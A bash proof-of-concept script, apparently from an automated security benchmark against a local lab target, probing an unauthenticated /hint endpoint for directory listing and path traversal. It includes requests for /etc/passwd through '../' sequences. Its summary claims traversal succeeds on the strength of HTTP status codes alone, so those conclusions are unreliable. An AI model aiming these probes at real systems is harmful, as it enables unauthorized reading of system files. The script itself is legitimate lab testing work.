#!/bin/bash
# POC: Demonstrates unauthenticated access to the /hint directory listing endpoint that accepts path parameters for potential directory traversal attacks
# Target: ./repo
# Created: 2025-11-07T22:10:33.469Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# POC for Information Disclosure: Unauthenticated Directory Listing Endpoint
# Tests the /hint endpoint for directory listing capability and path traversal

TARGET="${1:-http://localhost:3000}"
HINT_ENDPOINT="$TARGET/hint"

echo "=== Directory Listing Endpoint Information Disclosure POC ==="
echo "Target: $TARGET"
echo ""

# Test 1: Basic /hint endpoint access
echo "[Test 1] Testing basic /hint endpoint access..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$HINT_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ Endpoint accessible without authentication (HTTP 200)"
    if echo "$BODY" | grep -q "Directory Listing"; then
        echo "✓ Response contains 'Directory Listing' title - confirms directory listing functionality"
    fi
else
    echo "✗ Endpoint returned HTTP $HTTP_CODE"
fi
echo ""

# Test 2: Path parameter acceptance
echo "[Test 2] Testing path parameter acceptance..."
PATH_TEST=$(curl -s -w "\n%{http_code}" "$HINT_ENDPOINT?path=/etc/passwd")
PATH_HTTP_CODE=$(echo "$PATH_TEST" | tail -n1)
PATH_BODY=$(echo "$PATH_TEST" | head -n-1)

if [ "$PATH_HTTP_CODE" = "200" ]; then
    echo "✓ Endpoint accepts 'path' query parameter (HTTP 200)"
    echo "  Tested: $HINT_ENDPOINT?path=/etc/passwd"
else
    echo "✗ Path parameter test returned HTTP $PATH_HTTP_CODE"
fi
echo ""

# Test 3: Path traversal sequences
echo "[Test 3] Testing path traversal sequences..."
TRAVERSAL_TEST=$(curl -s -w "\n%{http_code}" "$HINT_ENDPOINT?path=../../../../../../etc/passwd")
TRAVERSAL_HTTP_CODE=$(echo "$TRAVERSAL_TEST" | tail -n1)

if [ "$TRAVERSAL_HTTP_CODE" = "200" ]; then
    echo "✓ Endpoint accepts path traversal sequences (HTTP 200)"
    echo "  Tested: $HINT_ENDPOINT?path=../../../../../../etc/passwd"
else
    echo "✗ Path traversal test returned HTTP $TRAVERSAL_HTTP_CODE"
fi
echo ""

# Test 4: Multiple parameter names accepted
echo "[Test 4] Testing arbitrary parameter acceptance..."
PARAMS=("path" "dir" "file" "target" "location" "route" "folder" "access" "view" "resource")
ACCEPTED=0

for param in "${PARAMS[@]}"; do
    PARAM_TEST=$(curl -s -w "%{http_code}" -o /dev/null "$HINT_ENDPOINT?$param=/test")
    if [ "$PARAM_TEST" = "200" ]; then
        ACCEPTED=$((ACCEPTED + 1))
    fi
done

echo "✓ Endpoint accepts $ACCEPTED out of ${#PARAMS[@]} tested parameter names without error"
echo ""

# Test 5: File-list div element check
echo "[Test 5] Checking for file-list HTML element..."
if echo "$BODY" | grep -q "file-list"; then
    echo "✓ Response contains 'file-list' div element for displaying directory contents"
else
    echo "✗ 'file-list' element not found in response"
fi
echo ""

# Test 6: Authentication requirement check
echo "[Test 6] Testing authentication requirement..."
NOAUTH_TEST=$(curl -s -w "\n%{http_code}" -H "Authorization: " "$HINT_ENDPOINT")
NOAUTH_HTTP_CODE=$(echo "$NOAUTH_TEST" | tail -n1)

if [ "$NOAUTH_HTTP_CODE" = "200" ]; then
    echo "✓ No authentication required - anonymous access allowed"
else
    echo "✗ Authentication check returned HTTP $NOAUTH_HTTP_CODE"
fi
echo ""

# Test 7: HTTP method restrictions
echo "[Test 7] Testing HTTP method restrictions..."
POST_TEST=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$HINT_ENDPOINT")
PUT_TEST=$(curl -s -w "%{http_code}" -o /dev/null -X PUT "$HINT_ENDPOINT")
DELETE_TEST=$(curl -s -w "%{http_code}" -o /dev/null -X DELETE "$HINT_ENDPOINT")

echo "  POST: HTTP $POST_TEST"
echo "  PUT: HTTP $PUT_TEST"
echo "  DELETE: HTTP $DELETE_TEST"

if [ "$POST_TEST" = "405" ] || [ "$PUT_TEST" = "405" ] || [ "$DELETE_TEST" = "405" ]; then
    echo "✓ Other HTTP methods blocked (405 Method Not Allowed) - indicates intentional GET-only design"
fi
echo ""

echo "=== POC Summary ==="
echo "The /hint endpoint is vulnerable to information disclosure through:"
echo "1. Unauthenticated access with HTTP 200 responses"
echo "2. Acceptance of path parameters for directory specification"
echo "3. Processing of path traversal sequences without validation"
echo "4. Directory listing capability exposed via HTML structure"
echo "5. No authentication or authorization checks enforced"